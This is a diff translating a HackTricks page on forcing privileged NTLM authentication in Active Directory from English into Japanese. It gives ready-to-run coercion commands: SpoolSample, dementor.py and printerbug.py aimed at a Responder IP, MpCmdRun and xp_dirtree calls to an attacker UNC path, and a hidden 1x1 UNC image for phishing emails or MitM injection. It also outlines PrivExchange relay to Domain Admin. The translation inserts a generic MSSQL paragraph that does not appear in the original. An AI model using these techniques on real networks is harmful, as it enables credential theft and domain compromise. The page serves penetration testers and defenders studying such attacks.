@@ -1,67 +1,57 @@
-# Force NTLM Privileged Authentication
+# NTLM特権認証を強制する
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
+* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
+* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
+* **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。
 
 </details>
 
 ## SharpSystemTriggers
 
-[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) is a **collection** of **remote authentication triggers** coded in C# using MIDL compiler for avoiding 3rd party dependencies.
+[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers)は、サードパーティの依存関係を回避するために、C#とMIDLコンパイラを使用してコーディングされた**リモート認証トリガー**の**コレクション**です。
 
-## Spooler Service Abuse
+## スプーラーサービスの乱用
 
-If the _**Print Spooler**_ service is **enabled,** you can use some already known AD credentials to **request** to the Domain Controller’s print server an **update** on new print jobs and just tell it to **send the notification to some system**.\
-Note when printer send the notification to an arbitrary systems, it needs to **authenticate against** that **system**. Therefore, an attacker can make the _**Print Spooler**_ service authenticate against an arbitrary system, and the service will **use the computer account** in this authentication.
+_**Print Spooler**_サービスが**有効**になっている場合、既知のAD資格情報を使用して、ドメインコントローラのプリントサーバーに新しい印刷ジョブの更新を要求し、通知を**いくつかのシステムに送信**することができます。\
+プリンタが任意のシステムに通知を送信する場合、そのシステムに**認証する必要があります**。したがって、攻撃者は_**Print Spooler**_サービスを任意のシステムに対して認証させることができ、この認証ではサービスはこのコンピュータのアカウントを**使用**します。
 
-### Finding Windows Servers on the domain
+### ドメイン上のWindowsサーバーの検索
 
-Using PowerShell, get a list of Windows boxes. Servers are usually priority, so lets focus there:
-
+PowerShellを使用して、Windowsボックスのリストを取得します。通常、サーバーが優先されるため、そこに焦点を当てましょう：
 ```bash
 Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
 ```
+### Spoolerサービスのリスニングを見つける
 
-### Finding Spooler services listening
-
-Using a slightly modified @mysmartlogin's (Vincent Le Toux's) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), see if the Spooler Service is listening:
-
+@mysmartlogin（Vincent Le Toux）の[SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket)を若干変更して使用し、Spoolerサービスがリスニングしているかどうかを確認します。
 ```bash
 . .\Get-SpoolStatus.ps1
 ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
 ```
-
-You can also use rpcdump.py on Linux and look for the MS-RPRN Protocol
-
+あなたはLinux上でrpcdump.pyを使用することもできます。MS-RPRNプロトコルを探してください。
 ```bash
 rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
 ```
+### 任意のホストに対してサービスに認証を要求する
 
-### Ask the service to authenticate against an arbitrary host
-
-You can compile[ **SpoolSample from here**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
-
+[ここからSpoolSampleをコンパイルします](https://github.com/NotMedic/NetNTLMtoSilverTicket)。
 ```bash
 SpoolSample.exe <TARGET> <RESPONDERIP>
 ```
-
-or use [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) or [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) if you're on Linux
-
+または、Linuxを使用している場合は、[**3xocyteのdementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket)または[**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)を使用します。
 ```bash
 python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
 printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
 ```
+### Unconstrained Delegationとの組み合わせ
 
-### Combining with Unconstrained Delegation
-
-If an attacker has already compromised a computer with [Unconstrained Delegation](unconstrained-delegation.md), the attacker could **make the printer authenticate against this computer**. Due to the unconstrained delegation, the **TGT** of the **computer account of the printer** will be **saved in** the **memory** of the computer with unconstrained delegation. As the attacker has already compromised this host, he will be able to **retrieve this ticket** and abuse it ([Pass the Ticket](pass-the-ticket.md)).
+もし攻撃者がすでに[Unconstrained Delegation](unconstrained-delegation.md)を利用してコンピュータを侵害している場合、攻撃者は**プリンタをこのコンピュータに認証させることができます**。Unconstrained Delegationにより、**プリンタのコンピュータアカウントのTGT**はUnconstrained Delegationを持つコンピュータの**メモリに保存されます**。攻撃者はすでにこのホストを侵害しているため、このチケットを**取得して悪用**することができます（[Pass the Ticket](pass-the-ticket.md)）。
 
 ## RCP Force authentication
 
@@ -69,63 +59,57 @@ If an attacker has already compromised a computer with [Unconstrained Delegation
 
 ## PrivExchange
 
-The `PrivExchange` attack results from a flaw in the Exchange Server `PushSubscription` feature, which allows **any domain user with a mailbox to force the Exchange server to authenticate** to any host provided by the client over HTTP.
+`PrivExchange`攻撃は、Exchange Serverの`PushSubscription`機能の欠陥に起因します。この欠陥により、メールボックスを持つ**任意のドメインユーザがExchangeサーバを強制的に認証させる**ことができます。認証はクライアントが提供する任意のホストを介してHTTP経由で行われます。
 
-The Exchange service runs as **SYSTEM** and is **over-privileged** by default (i.e., has WriteDacl privileges on the domain pre-2019 Cumulative Update). This flaw can be leveraged to r**elay to LDAP and dump the domain NTDS database**. If we cannot relay to LDAP, this can be leveraged to relay and authenticate to **other hosts** within the domain. This attack will take you directly to Domain Admin with any authenticated domain user account.
+Exchangeサービスは**SYSTEM**として実行され、デフォルトで**特権が与えられています**（つまり、2019年以前の累積更新プログラムではドメインのWriteDacl特権を持っています）。この欠陥を利用して、LDAPにリレーしドメインのNTDSデータベースをダンプすることができます。LDAPにリレーできない場合でも、ドメイン内の**他のホスト**にリレーして認証することができます。この攻撃により、認証されたドメインユーザアカウントを使用して直接ドメイン管理者になることができます。
 
-****[**This technique was copied from here.**](https://academy.hackthebox.com/module/143/section/1276)****
+****[**この技術はここからコピーされました。**](https://academy.hackthebox.com/module/143/section/1276)****
 
-## Inside Windows
+## Windows内部
 
-If you are already inside the Windows machine you can force Windows to connect to a server using privileged accounts with:
+Windowsマシン内にすでにアクセスしている場合、特権アカウントを使用してWindowsをサーバに接続させることができます。
 
 ### Defender MpCmdRun
-
 ```bash
 C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
 ```
-
 ### MSSQL
 
+MSSQLは、Microsoft SQL Serverの略称です。これは、Microsoftが開発したリレーショナルデータベース管理システム（RDBMS）です。MSSQLは、Windowsプラットフォーム上で広く使用されており、企業や組織でのデータ管理に使用されています。MSSQLは、データの格納、クエリの実行、データのバックアップと復元など、さまざまなデータベース関連のタスクをサポートしています。MSSQLは、セキュリティ機能や高可用性オプションなど、さまざまな機能を提供しています。
 ```sql
 EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
 ```
+または、この別のテクニックを使用することもできます：[https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)
 
-Or use this other technique: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)
+## HTMLインジェクション
 
-## HTML injection
+### メール経由
 
-### Via email
-
-If you know the **email address** of the user that logs inside a machine you want to compromise, you could just send him an **email with a 1x1 image** such as
-
+侵害したいマシンにログインするユーザーの**メールアドレス**を知っている場合、単に1x1の画像を含む**メールを送信**することができます。
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
-
-and when he opens it, he will try to authenticate.
+そして彼がそれを開くと、彼は認証を試みるでしょう。
 
 ### MitM
 
-If you can perform a MitM attack to a computer and inject HTML in a page he will visualize you could try injecting an image like the following in the page:
-
+コンピュータに対してMitM攻撃を実行し、彼が視覚化する可能性のあるページにHTMLを注入できる場合、次のような画像をページに注入してみることができます：
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
+## NTLMv1のクラック
 
-## Cracking NTLMv1
-
-If you can capture [NTLMv1 challenges read here how to crack them](../ntlm/#ntlmv1-attack).\
-_Remember that in order to crack NTLMv1 you need to set Responder challenge to "1122334455667788"_
+[NTLMv1のチャレンジをキャプチャする方法](../ntlm/#ntlmv1-attack)を読んで、それらをクラックする方法を確認してください。\
+_NTLMv1をクラックするには、Responderのチャレンジを「1122334455667788」に設定する必要があることを忘れないでください。_
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけて、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを発見してください。
+* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
+* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
+* **ハッキングのトリックを共有するには、[hacktricksのリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudのリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。
 
 </details>
